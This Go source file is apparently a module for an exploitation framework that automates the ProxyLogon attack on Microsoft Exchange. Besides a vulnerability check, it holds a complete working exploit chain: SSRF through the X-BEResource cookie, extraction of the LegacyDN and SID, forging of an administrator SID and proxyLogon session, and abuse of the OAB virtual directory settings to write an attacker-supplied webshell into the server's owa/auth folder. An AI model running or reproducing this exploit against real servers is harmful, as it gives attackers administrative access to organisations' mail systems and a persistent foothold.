package exp_exchange

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"regexp"
	"strings"
)

type exVersion struct {
	ProductName string
	ReleaseDate string
}

var (
	versionsStr = `Exchange Server 2019 CU9 May21SU,2021 年 5 月 11 日,15.2.858
Exchange Server 2019 CU8 May21SU,2021 年 5 月 11 日,15.2.792
Exchange Server 2019 CU7 Mar21SU,2021 年 3 月 2 日,15.2.721
Exchange Server 2019 CU6 Mar21SU,2021 年 3 月 2 日,15.2.659
Exchange Server 2019 CU5 Mar21SU,2021 年 3 月 2 日,15.2.595
Exchange Server 2019 CU4 Mar21SU,2021 年 3 月 2 日,15.2.529
Exchange Server 2019 CU3 Mar21SU,2021 年 3 月 2 日,15.2.464
Exchange Server 2019 CU2 Mar21SU,2021 年 3 月 2 日,15.2.397
Exchange Server 2019 CU1 Mar21SU,2021 年 3 月 2 日,15.2.330
Exchange Server 2019 RTM Mar21SU,2021 年 3 月 2 日,15.2.221
Exchange Server 2019 Preview,2018 年 7 月 24 日,15.2.196
Exchange Server 2016 CU20 May21SU,2021 年 5 月 11 日,15.1.2242
Exchange Server 2016 CU19 May21SU,2021 年 5 月 11 日,15.1.2176
Exchange Server 2016 CU18 Mar21SU,2021 年 3 月 2 日,15.1.2106
Exchange Server 2016 CU17 Mar21SU,2021 年 3 月 2 日,15.1.2044
Exchange Server 2016 CU16 Mar21SU,2021 年 3 月 2 日,15.1.1979
Exchange Server 2016 CU15 Mar21SU,2021 年 3 月 2 日,15.1.1913
Exchange Server 2016 CU14 Mar21SU,2021 年 3 月 2 日,15.1.1847
Exchange Server 2016 CU13 Mar21SU,2021 年 3 月 2 日,15.1.1779
Exchange Server 2016 CU12 Mar21SU,2021 年 3 月 2 日,15.1.1713
Exchange Server 2016 CU11 Mar21SU,2021 年 3 月 2 日,15.1.1591
Exchange Server 2016 CU10 Mar21SU,2021 年 3 月 2 日,15.1.1531
Exchange Server 2016 CU9 Mar21SU,2021 年 3 月 2 日,15.1.1466
Exchange Server 2016 CU8 Mar21SU,2021 年 3 月 2 日,15.1.1415
Exchange Server 2016 CU7,2017 年 9 月 19 日,15.1.1261
Exchange Server 2016 CU6,2017 年 6 月 27 日,15.1.1034
Exchange Server 2016 CU5,2017 年 3 月 21 日,15.1.845
Exchange Server 2016 CU4,2016 年 12 月 13 日,15.1.669
Exchange Server 2016 CU3,2016 年 9 月 20 日,15.1.544
Exchange Server 2016 CU2,2016 年 6 月 21 日,15.1.466
Exchange Server 2016 CU1,2016 年 3 月 15 日,15.1.396
Exchange Server 2016 RTM,2015 年 10 月 1 日,15.1.225
Exchange Server 2013 CU23 May21SU,2021 年 5 月 11 日,15.0.1497
Exchange Server 2013 CU22 Mar21SU,2021 年 3 月 2 日,15.0.1473
Exchange Server 2013 CU21 Mar21SU,2021 年 3 月 2 日,15.0.1395
Exchange Server 2013 CU20,2018 年 3 月 20 日,15.0.1367
Exchange Server 2013 CU19,2017 年 12 月 19 日,15.0.1365
Exchange Server 2013 CU18,2017 年 9 月 19 日,15.0.1347
Exchange Server 2013 CU17,2017 年 6 月 27 日,15.0.1320
Exchange Server 2013 CU16,2017 年 3 月 21 日,15.0.1293
Exchange Server 2013 CU15,2016 年 12 月 13 日,15.0.1263
Exchange Server 2013 CU14,2016 年 9 月 20 日,15.0.1236
Exchange Server 2013 CU13,2016 年 6 月 21 日,15.0.1210
Exchange Server 2013 CU12,2016 年 3 月 15 日,15.0.1178
Exchange Server 2013 CU11,2015 年 12 月 15 日,15.0.1156
Exchange Server 2013 CU10,2015 年 9 月 15 日,15.0.1130
Exchange Server 2013 CU9,2015 年 6 月 17 日,15.0.1104
Exchange Server 2013 CU8,2015 年 3 月 17 日,15.0.1076
Exchange Server 2013 CU7,2014 年 12 月 9 日,15.0.1044
Exchange Server 2013 CU6,2014 年 8 月 26 日,15.0.995
Exchange Server 2013 CU5,2014 年 5 月 27 日,15.0.913
Exchange Server 2013 SP1 Mar21SU,2021 年 3 月 2 日,15.0.847
Exchange Server 2013 CU3,2013 年 11 月 25 日,15.0.775
Exchange Server 2013 CU2,2013 年 7 月 9 日,15.0.712
Exchange Server 2013 CU1,2013 年 4 月 2 日,15.0.620
Exchange Server 2013 RTM,2012 年 12 月 3 日,15.0.516
Exchange Server 2010 SP3 更新汇总 32,2021 年 3 月 2 日,14.3.513
Exchange Server 2010 SP3 更新汇总 31,2020 年 12 月 1 日,14.3.509
Exchange Server 2010 SP3 更新汇总 30,2020 年 2 月 11 日,14.3.496
Exchange Server 2010 SP3 更新汇总 29,2019 年 7 月 9 日,14.3.468
Exchange Server 2010 SP3 更新汇总 28,2019 年 6 月 7 日,14.3.461
Exchange Server 2010 SP3 更新汇总 27,2019 年 4 月 9 日,14.3.452
Exchange Server 2010 SP3 更新汇总 26,2019 年 2 月 12 日,14.3.442
Exchange Server 2010 SP3 更新汇总 25,2019 年 1 月 8 日,14.3.435
Exchange Server 2010 SP3 更新汇总 24,2018 年 9 月 5 日,14.3.419
Exchange Server 2010 SP3 更新汇总 23,2018 年 8 月 13 日,14.3.417
Exchange Server 2010 SP3 更新汇总 22,2018 年 6 月 19 日,14.3.411
Exchange Server 2010 SP3 更新汇总 21,2018 年 5 月 7 日,14.3.399
Exchange Server 2010 SP3 更新汇总 20,2018 年 3 月 5 日,14.3.389
Exchange Server 2010 SP3 更新汇总 19,2017 年 12 月 19 日,14.3.382
Exchange Server 2010 SP3 更新汇总 18,2017 年 7 月 11 日,14.3.361
Exchange Server 2010 SP3 更新汇总 17,2017 年 3 月 21 日,14.3.352
Exchange Server 2010 SP3 更新汇总 16,2016 年 12 月 13 日,14.3.336
Exchange Server 2010 SP3 更新汇总 15,2016 年 9 月 20 日,14.3.319
Exchange Server 2010 SP3 更新汇总 14,2016 年 6 月 21 日,14.3.301
Exchange Server 2010 SP3 更新汇总 13,2016 年 3 月 15 日,14.3.294
Exchange Server 2010 SP3 更新汇总 12,2015 年 12 月 15 日,14.3.279
Exchange Server 2010 SP3 更新汇总 11,2015 年 9 月 15 日,14.3.266
Exchange Server 2010 SP3 更新汇总 10,2015 年 6 月 17 日,14.3.248
Exchange Server 2010 SP3 更新汇总 9,2015 年 3 月 17 日,14.3.235
Exchange Server 2010 SP3 更新汇总 8 v2,2014 年 12 月 12 日,14.3.224
Exchange Server 2010 SP3 更新汇总 7,2014 年 8 月 26 日,14.3.210
Exchange Server 2010 SP3 更新汇总 6,2014 年 5 月 27 日,14.3.195
Exchange Server 2010 SP3 更新汇总 5,2014 年 2 月 24 日,14.3.181
Exchange Server 2010 SP3 更新汇总 4,2013 年 12 月 9 日,14.3.174
Exchange Server 2010 SP3 更新汇总 3,2013 年 11 月 25 日,14.3.169
Exchange Server 2010 SP3 更新汇总 2,2013 年 8 月 8 日,14.3.158
Exchange Server 2010 SP3 更新汇总 1,2013 年 5 月 29 日,14.3.146
Exchange Server 2010 SP3,2013 年 2 月 12 日,14.3.123
Exchange Server 2010 SP2 更新汇总 8,2013 年 12 月 9 日,14.2.390
Exchange Server 2010 SP2 更新汇总 7,2013 年 8 月 3 日,14.2.375
Exchange Server 2010 SP2 更新汇总 6,2013 年 2 月 12 日,14.2.342
Exchange Server 2010 SP2 更新汇总 5 v2,2012 年 12 月 10 日,14.2.328
Exchange Server 2010 SP2 更新汇总 5,2012 年 11 月 13 日,14.3.328
Exchange Server 2010 SP2 更新汇总 4 v2,2012 年 10 月 9 日,14.2.318
Exchange Server 2010 SP2 更新汇总 3,2012 年 5 月 29 日,14.2.309
Exchange Server 2010 SP2 更新汇总 2,2012 年 4 月 16 日,14.2.298
Exchange Server 2010 SP2 更新汇总 1,2012 年 2 月 13 日,14.2.283
Exchange Server 2010 SP2,2011 年 12 月 4 日,14.2.247
Exchange Server 2010 SP1 更新汇总 8,2012 年 12 月 10 日,14.1.438
Exchange Server 2010 SP1 更新汇总 7 v3,2012 年 11 月 13 日,14.1.421
Exchange Server 2010 SP1 更新汇总 6,2011 年 10 月 27 日,14.1.355
Exchange Server 2010 SP1 更新汇总 5,2011 年 8 月 23 日,14.1.339
Exchange Server 2010 SP1 更新汇总 4,2011 年 7 月 27 日,14.1.323
Exchange Server 2010 SP1 更新汇总 3,2011 年 4 月 6 日,14.1.289
Exchange Server 2010 SP1 更新汇总 2,2010 年 12 月 9 日,14.1.270
Exchange Server 2010 SP1 更新汇总 1,2010 年 10 月 4 日,14.1.255
Exchange Server 2010 SP1,2010 年 8 月 23 日,14.1.218
Exchange Server 2010 更新汇总 5,2010 年 12 月 13 日,14.0.726
Exchange Server 2010 更新汇总 4,2010 年 6 月 10 日,14.0.702
Exchange Server 2010 更新汇总 3,2010 年 4 月 13 日,14.0.694
Exchange Server 2010 更新汇总 2,2010 年 3 月 4 日,14.0.689
Exchange Server 2010 更新汇总 1,2009 年 12 月 9 日,14.0.682
Exchange Server 2010 RTM,2009 年 11 月 9 日,14.0.639`
	exVersions = make(map[string]exVersion)
)

func getVersions() {
	lines := strings.Split(versionsStr, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		lineSlice := strings.Split(line, ",")
		if len(lineSlice) > 2 {
			exVersions[lineSlice[2]] = exVersion{
				ProductName: lineSlice[0],
				ReleaseDate: lineSlice[1],
			}
		}
	}
}

type Exp_Proxylogon struct {
	exp_templates.ExpTemplate
}

func (self *Exp_Proxylogon) Attack_upload() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	//headers := self.GetInitExpHeaders()

	target := strings.TrimRight(self.Params.BaseParam.Target, "/")
	u, err := url.Parse(target)
	if err != nil {
		expResult.Err = err.Error()
		return
	}

	email := self.MustGetStringParam("email")

	//payloadName := "shell.aspx"
	randName := goutils.RandStrWithMeta(5, goutils.LowerLitter) + ".js"
	shellPath := fmt.Sprintf("Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s", filename)

	shellAbsolutePath := fmt.Sprintf("\\\\127.0.0.1\\c$\\%s", shellPath)
	shellContent := content
	//legacyDnPatchByte := "68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a"
	autoDiscoverBody := fmt.Sprintf(`<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>`, email)

	// 探测是否存在SSRF
	self.EchoSuccessMsg("Attempting SSRF")
	FQDN := u.Host
	headers := self.GetInitExpHeaders()
	headers.Set("Cookie", "X-BEResource=localhost~1942062522")
	target = fmt.Sprintf("%s/ecp/%s", target, randName)
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.Header.Get("X-FEServer") != "" && httpresp.Resp.Header.Get("X-CalculatedBETarget") != "" {
		FQDN = httpresp.Resp.Header.Get("X-FEServer")
	}

	// 获取LegacyDN
	headers = self.GetInitExpHeaders()
	headers.Set("Cookie", fmt.Sprintf("X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;", FQDN))
	headers.Set("Content-Type", "text/xml")
	httpresp = self.HttpPostWithoutRedirect(target, autoDiscoverBody, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("Autodiscover Error!")
		return
	}
	if !strings.Contains(httpresp.Body, "<LegacyDN>") {
		self.EchoErrMsg("Can not get LegacyDN!")
		return
	}
	tmpSlice := regexp.MustCompile(`(?s)<LegacyDN>(.*?)</LegacyDN>`).FindStringSubmatch(httpresp.Body)
	if len(tmpSlice) < 2 {
		self.EchoErrMsg("Can not get LegacyDN!")
		return
	}
	legacyDn := tmpSlice[1]
	mapiBody := legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
	self.EchoSuccessMsg("DN: " + legacyDn)

	// 获取SID
	headers = self.GetInitExpHeaders()
	headers.Set("Cookie", fmt.Sprintf("X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=c8c9275b-4f46-4d48-9096-f0ec2e4ac8eb@lab.local&a=~1942062522;", FQDN))
	headers.Set("Content-Type", "application/mapi-http")
	headers.Set("X-Requesttype", "Connect")
	headers.Set("X-Clientinfo", "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}")
	headers.Set("X-Clientapplication", "Outlook/15.0.4815.1002")
	headers.Set("X-Requestid", "{C715155F-2BE8-44E0-BD34-2960067874C8}:2")

	httpresp = self.HttpPostWithoutRedirect(target, mapiBody, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 || !strings.Contains(httpresp.Body, "act as owner of a UserMailbox") {
		self.EchoErrMsg("获取SID失败，Mapi Error!")
		return
	}
	tmpSlice = regexp.MustCompile(`(?s)with SID (.*?) and MasterAccountSid`).FindStringSubmatch(httpresp.Body)
	if len(tmpSlice) < 2 {
		self.EchoErrMsg("未找到SID")
		return
	}
	// 提取SID
	sid := tmpSlice[1]
	tmpSlice = strings.Split(sid, "-")
	if len(tmpSlice) < 2 {
		self.EchoErrMsg("SID格式错误")
		return
	}
	// 修改SID，转换成administrator的sid
	subValue := tmpSlice[len(tmpSlice)-1]
	if subValue == "500" {
		self.EchoSuccessMsg("SID: " + sid)
	} else {
		self.EchoSuccessMsg("Original SID: " + sid)
		sid = strings.Join(tmpSlice[0:len(tmpSlice)-1], "-") + "-500"
		self.EchoSuccessMsg("Corrected SID: " + sid)
	}

	self.EchoSuccessMsg("SSRF Successful!")
	self.EchoSuccessMsg("Attempting Arbitrary File Write")

	// 获取Cookie
	proxyLogonRequest := fmt.Sprintf(`<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>`, sid)
	headers = self.GetInitExpHeaders()
	headers.Set("Cookie", fmt.Sprintf("X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;", FQDN))
	headers.Set("msExchLogonAccount", sid)
	headers.Set("msExchLogonMailbox", sid)
	headers.Set("msExchTargetMailbox", sid)
	headers.Set("Content-Type", "text/xml")
	httpresp = self.HttpPostWithoutRedirect(target, proxyLogonRequest, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 241 || httpresp.Resp.Header.Get("Set-Cookie") == "" {
		self.EchoErrMsg("Proxylogon Error!")
		return
	}
	cookies := httpresp.Resp.Header.Values("Set-Cookie")
	if len(cookies) < 2 {
		self.EchoErrMsg("未获取到Cookie")
		return
	}
	sessId := ""
	msExchEcpCanary := ""
	for _, cookie := range cookies {
		tmpSlice = regexp.MustCompile(`ASP\.NET_SessionId=(.*?);`).FindStringSubmatch(cookie)
		if len(tmpSlice) == 2 {
			sessId = tmpSlice[1]
		} else {
			tmpSlice = regexp.MustCompile(`msExchEcpCanary=(.*?);`).FindStringSubmatch(cookie)
			if len(tmpSlice) == 2 {
				msExchEcpCanary = tmpSlice[1]
			}
		}

	}
	self.EchoSuccessMsg("SessionID: " + sessId)
	self.EchoSuccessMsg("CanaryToken: " + msExchEcpCanary)

	// 检查是否登录成功
	headers = self.GetInitExpHeaders()
	headers.Set("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, sessId, msExchEcpCanary))
	headers.Set("msExchLogonAccount", sid)
	headers.Set("msExchLogonMailbox", sid)
	headers.Set("msExchTargetMailbox", sid)
	httpresp = self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("Wrong canary!")
		self.EchoErrMsg("Sometime we can skip this ...")
	}
	tmpSlice = regexp.MustCompile(`(?s)RBAC roles:</span> <span class='diagTxt'>(.*?)</span>`).FindStringSubmatch(httpresp.Body)
	if len(tmpSlice) > 1 {
		rbacRole := tmpSlice[1]
		fmt.Println(rbacRole)
	}

	// 获取OABId
	headers = self.GetInitExpHeaders()
	//headers.Set("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s",
	//	FQDN, msExchEcpCanary, sessId, msExchEcpCanary))
	headers.Set("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s",
		FQDN, msExchEcpCanary, sessId, msExchEcpCanary))
	headers.Set("Content-Type", "application/json; charset=utf-8")
	headers.Set("msExchLogonAccount", sid)
	headers.Set("msExchLogonMailbox", sid)
	headers.Set("msExchTargetMailbox", sid)
	data := `{"filter": {"Parameters": {"SelectedView": "", "SelectedVDirType": "OAB", "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"}}, "sort": {}}`
	httpresp = self.HttpPostWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("GetOAB Error!")
		return
	}

	tmpSlice = regexp.MustCompile(`(?s)"RawIdentity":"(.*?)"`).FindStringSubmatch(httpresp.Body)
	if len(tmpSlice) < 2 {
		self.EchoErrMsg("OABId获取失败")
		return
	}
	oabId := tmpSlice[1]
	self.EchoSuccessMsg("OABId: " + oabId)

	// 上传webshell
	data = fmt.Sprintf(`{"properties": {"Parameters": {"ExternalUrl": "https://ffff/#%s", "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"}}, "identity": {"DisplayName": "OAB (Default Web Site)", "__type": "Identity:ECP", "RawIdentity": "%s"}}`,
		strings.ReplaceAll(shellContent, `"`, `\"`), oabId)
	headers = self.GetInitExpHeaders()
	headers.Set("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, msExchEcpCanary, sessId, msExchEcpCanary))
	headers.Set("Content-Type", "application/json; charset=utf-8")
	headers.Set("msExchLogonAccount", sid)
	headers.Set("msExchLogonMailbox", sid)
	headers.Set("msExchTargetMailbox", sid)
	httpresp = self.HttpPostWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("Set external url Error!")
		return
	}

	// 保存webshell
	data = fmt.Sprintf(`{"properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "FilePathName": "%s"}}, "identity": {"DisplayName": "OAB (Default Web Site)", "__type": "Identity:ECP", "RawIdentity": "%s"}}`,
		strings.ReplaceAll(shellAbsolutePath, `\`, `\\`), oabId)
	headers = self.GetInitExpHeaders()
	headers.Set("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, msExchEcpCanary, sessId, msExchEcpCanary))
	headers.Set("Content-Type", "application/json; charset=utf-8")
	headers.Set("msExchLogonAccount", sid)
	headers.Set("msExchLogonMailbox", sid)
	headers.Set("msExchTargetMailbox", sid)
	httpresp = self.HttpPostWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("Error writing the shell. Status code returned ")
		return
	}
	self.EchoSuccessMsg("Success!")
	self.EchoSuccessMsg("shell路径: %s", strings.TrimRight(self.Params.BaseParam.Target, "/")+"/owa/auth/"+filename)
	expResult.Status = true

	return
}
func (self *Exp_Proxylogon) Attack_getmsg() (expResult exp_model.ExpResult) {
	getVersions()

	// 默认配置
	headers := self.GetInitExpHeaders()
	target := strings.TrimRight(self.Params.BaseParam.Target, "/")
	httpresp := self.HttpGet(target+"/owa/auth/logon.aspx", headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	tmpSlice := regexp.MustCompile(`/owa/auth/(.*?)/themes/resources/favicon\.ico`).FindStringSubmatch(httpresp.Body)
	tmpSlice2 := regexp.MustCompile(`/owa/(.*?)/themes/base/favicon\.ico`).FindStringSubmatch(httpresp.Body)
	buildNumber := ""
	if len(tmpSlice) > 1 {
		buildNumber = tmpSlice[1]
	} else if len(tmpSlice2) > 1 {
		buildNumber = tmpSlice2[1]
	}
	if buildNumber != "" {
		self.EchoSuccessMsg("exchange 内部版本号: " + buildNumber)
		if ver, ok := exVersions[buildNumber]; ok {
			self.EchoSuccessMsg("产品名称: " + ver.ProductName)
			self.EchoSuccessMsg("发布日期: " + ver.ReleaseDate)

		}
	}

	randName := goutils.RandStrWithMeta(5, goutils.LowerLitter) + ".js"
	headers = self.GetInitExpHeaders()
	headers.Set("Cookie", "X-BEResource=localhost~1942062522")
	target = fmt.Sprintf("%s/ecp/%s", target, randName)
	httpresp = self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	if httpresp.Resp.Header.Get("X-CalculatedBETarget") == "localhost" {
		self.EchoSuccessMsg("存在漏洞")
	} else {
		self.EchoErrMsg("不存在漏洞")
	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_Proxylogon{}, "exp_Proxylogon.yml")

}
